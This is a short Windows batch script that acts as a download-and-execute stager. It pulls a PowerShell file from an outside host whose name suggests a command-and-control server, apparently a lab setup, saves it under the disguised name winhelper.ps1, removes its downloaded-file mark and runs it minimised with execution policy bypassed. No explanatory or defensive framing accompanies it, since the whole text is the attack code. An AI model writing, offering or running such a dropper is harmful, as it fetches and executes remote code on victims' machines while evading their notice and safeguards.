@echo off
set PS1=%TEMP%\winhelper.ps1
powershell -Command "Invoke-WebRequest -Uri 'https://lab-c2.onrender.com/download' -OutFile '%PS1%' -UseBasicParsing; Unblock-File '%PS1%'"
start /min powershell -ExecutionPolicy Bypass -NonInteractive -File "%PS1%"
exit
